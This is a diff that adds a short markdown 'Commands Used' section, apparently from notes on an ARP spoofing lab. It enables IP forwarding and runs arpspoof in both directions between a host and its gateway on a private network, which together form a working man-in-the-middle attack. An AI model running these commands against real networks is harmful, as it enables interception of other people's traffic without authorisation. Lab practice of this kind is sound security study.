@@ -1,0 +1,7 @@
+## 🧩 Commands Used
+
+```bash
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+sudo arpspoof -i eth0 -t 192.168.0.101 192.168.0.1
+sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.101
